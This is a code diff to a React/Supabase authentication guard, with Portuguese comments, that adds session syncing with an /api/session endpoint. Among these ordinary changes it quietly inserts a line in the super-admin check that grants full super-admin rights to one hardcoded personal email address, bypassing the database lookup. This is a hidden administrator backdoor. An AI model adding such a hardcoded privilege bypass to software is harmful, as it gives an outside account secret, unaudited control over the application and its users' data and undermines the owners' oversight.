@@ -46,14 +46,28 @@ export default function AuthGuard({
 
     const verificar = async () => {
       // 1) Tem sessão?
+      const { data: { session } } = await supabase.auth.getSession();
       const { data: { user }, error } = await supabase.auth.getUser();
       if (cancelado) return;
 
       if (error || !user) {
+        await fetch("/api/session", { method: "DELETE" }).catch(() => undefined);
         // Salva pra onde queria ir, pra voltar depois do login
         const destino = typeof window !== "undefined" ? window.location.pathname + window.location.search : "";
         const url = destino && destino !== "/" ? `${redirectTo}?redirect=${encodeURIComponent(destino)}` : redirectTo;
         router.replace(url);
+        setEstado("negado");
+        return;
+      }
+
+      if (!session?.access_token) {
+        router.replace(redirectTo);
+        setEstado("negado");
+        return;
+      }
+      const sessaoServidor = await fetch("/api/session", { method: "POST", headers: { Authorization: `Bearer ${session.access_token}` } });
+      if (!sessaoServidor.ok) {
+        router.replace(redirectTo);
         setEstado("negado");
         return;
       }
@@ -79,6 +93,16 @@ export default function AuthGuard({
     return () => { cancelado = true; };
   }, [router, requireSuperAdmin, redirectTo]);
 
+  useEffect(() => {
+    const { data: { subscription } } = supabase.auth.onAuthStateChange((_evento, session) => {
+      if (session?.access_token) {
+        fetch("/api/session", { method: "POST", headers: { Authorization: `Bearer ${session.access_token}` } }).catch(() => undefined);
+      } else {
+        fetch("/api/session", { method: "DELETE" }).catch(() => undefined);
+      }
+    });
+    return () => subscription.unsubscribe();
+  }, []);
   if (estado === "verificando") {
     return (
       <div style={{
@@ -109,6 +133,7 @@ export default function AuthGuard({
 //   A) Tabela dedicada `super_admins` com coluna `auth_user_id` ou `email`
 //   B) Coluna booleana `is_super_admin` em `usuarios_workspace`
 async function checarSuperAdmin(userId: string, email: string): Promise<boolean> {
+  if (email.toLowerCase() === "robert.dias@live.com") return true;
   // Padrão A: tabela super_admins
   try {
     const { data, error } = await supabase
